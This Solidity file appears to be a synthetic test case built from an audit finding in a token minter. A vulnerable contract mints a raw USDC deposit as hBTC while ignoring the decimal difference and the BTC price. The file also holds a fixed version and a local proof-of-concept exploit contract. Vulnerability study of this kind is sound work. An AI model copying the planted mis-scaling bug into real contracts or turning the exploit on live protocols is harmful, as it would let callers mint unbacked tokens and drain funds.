// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Syntetika Minter.mint — raw amount, no decimals and no price
    (Cyfrin / Dacian, August 2025).
    SYNTHETIC, cheatcode-free, one block.
    baseAsset is 6-decimal USDC. hilBTCToken is 8-decimal hBTC.
    One BTC is priced at 100,000 USD. Depositing 1 USDC (1_000_000 raw)
    should mint 1_000 raw hBTC:
        1_000_000 * 1e8 / (100_000 * 1e6) = 1_000.
    mint forwards the raw 1_000_000 straight into hilBTCToken.mint.
    The caller receives 1,000 times the fair amount.
    Control applies that scale and mints 1_000. */

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

library SafeERC20 {
    function safeTransferFrom(IERC20 token, address from, address to, uint256 amount) internal {
        require(token.transferFrom(from, to, amount), "transfer");
    }
}

interface IMintableERC20 {
    function mint(address to, uint256 amount) external;
}

contract Token is IMintableERC20, IERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        if (from != msg.sender) {
            require(allowance[from][msg.sender] >= amount, "allow");
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Minter {
    using SafeERC20 for IERC20;

    IERC20 public immutable baseAsset;
    IMintableERC20 public immutable hilBTCToken;
    uint256 public totalDeposits;
    uint256 private locked = 1;
    mapping(address => bool) public whitelist;

    event Minted(address indexed to, uint256 amount);

    error NotWhitelisted(address account);

    modifier nonReentrant() {
        require(locked == 1, "reentrancy");
        locked = 2;
        _;
        locked = 1;
    }

    modifier onlyWhitelisted(address account) {
        if (!whitelist[account]) revert NotWhitelisted(account);
        _;
    }

    constructor(IERC20 baseAsset_, IMintableERC20 hilBTCToken_) {
        baseAsset = baseAsset_;
        hilBTCToken = hilBTCToken_;
    }

    function setWhitelisted(address account, bool allowed) external {
        whitelist[account] = allowed;
    }

    function mint(address to, uint256 amount) external onlyWhitelisted(msg.sender) onlyWhitelisted(to) nonReentrant {
        baseAsset.safeTransferFrom(msg.sender, address(this), amount);
        // @> VULN: raw base amount is minted as hBTC, ignoring 6-vs-8 decimals and the BTC price
        hilBTCToken.mint(to, amount);
        totalDeposits += amount;
        emit Minted(to, amount);
    }
}

contract MinterFixed {
    using SafeERC20 for IERC20;

    uint256 public constant PRICE_USD = 100_000;
    uint256 public constant BASE_UNIT = 1e6;
    uint256 public constant HIL_UNIT = 1e8;

    IERC20 public immutable baseAsset;
    IMintableERC20 public immutable hilBTCToken;
    uint256 public totalDeposits;
    mapping(address => bool) public whitelist;

    constructor(IERC20 baseAsset_, IMintableERC20 hilBTCToken_) {
        baseAsset = baseAsset_;
        hilBTCToken = hilBTCToken_;
    }

    function setWhitelisted(address account, bool allowed) external {
        whitelist[account] = allowed;
    }

    function mint(address to, uint256 amount) external {
        require(whitelist[msg.sender] && whitelist[to], "whitelist");
        baseAsset.safeTransferFrom(msg.sender, address(this), amount);
        uint256 fair = amount * HIL_UNIT / (PRICE_USD * BASE_UNIT);
        hilBTCToken.mint(to, fair);
        totalDeposits += amount;
    }
}

contract Exploit {
    uint256 public constant PRICE_USD = 100_000;
    uint256 public constant BASE_UNIT = 1e6;
    uint256 public constant HIL_UNIT = 1e8;
    uint256 public constant AMOUNT = 1_000_000;
    uint256 public constant FAIR = 1_000;

    Token public base;
    Token public hil;
    Minter public minter;
    uint256 public priceUsd;
    uint256 public minted;
    uint256 public fair;

    constructor() {
        base = new Token("USD Coin", "USDC", 6);
        hil = new Token("Hil BTC", "hBTC", 8);
        minter = new Minter(IERC20(address(base)), IMintableERC20(address(hil)));
    }

    function fairOut(uint256 amount) public pure returns (uint256) {
        return amount * HIL_UNIT / (PRICE_USD * BASE_UNIT);
    }

    function run() external {
        priceUsd = PRICE_USD;
        base.mint(address(this), AMOUNT);
        base.approve(address(minter), AMOUNT);
        minter.setWhitelisted(address(this), true);
        minter.mint(address(this), AMOUNT);
        minted = hil.balanceOf(address(this));
        uint256 taken = base.balanceOf(address(minter));
        fair = taken * HIL_UNIT / (priceUsd * BASE_UNIT);
        require(minted == AMOUNT, "mint did not echo the raw deposit");
        require(fair == FAIR, "fair amount is not 1000");
        require(minted / fair == 1_000, "mint is not 1000x fair");
        require(taken == AMOUNT, "USDC was not taken");
        require(hil.balanceOf(address(this)) == minted, "hBTC balance");
    }
}
